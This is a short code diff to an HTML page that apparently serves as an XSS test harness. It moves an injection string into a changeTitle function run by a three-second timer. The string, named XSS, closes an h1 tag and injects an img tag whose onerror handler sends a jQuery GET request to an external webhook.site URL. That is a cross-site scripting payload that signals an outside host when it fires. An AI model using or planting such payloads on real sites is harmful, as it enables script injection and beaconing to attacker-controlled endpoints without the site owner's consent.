@@ -8,15 +8,13 @@
 <body>
   <p>"DATA"</p>
   <script>
-
-      var XSS = '</h1><img src="adfdsa" href=1 onerror="(function(){$.get(\'https://webhook.site/e6ee5b29-cbae-45b0-84f2-f09da517960e\')})()">';
-
-      document.title = XSS;
-
-    }
-
+      function changeTitle(){
+        var XSS = '</h1><img src="adfdsa" href=1 onerror="(function(){$.get(\'https://webhook.site/e6ee5b29-cbae-45b0-84f2-f09da517960e\')})()">';
+  
+        document.title = XSS;
+      }
     // Wait for 3 seconds and then create the script tag with the POST request
-    setTimeout(createScriptWithPostRequest, 3000);
+    setTimeout(changeTitle,3000);
   </script>
 </body>
 </html>
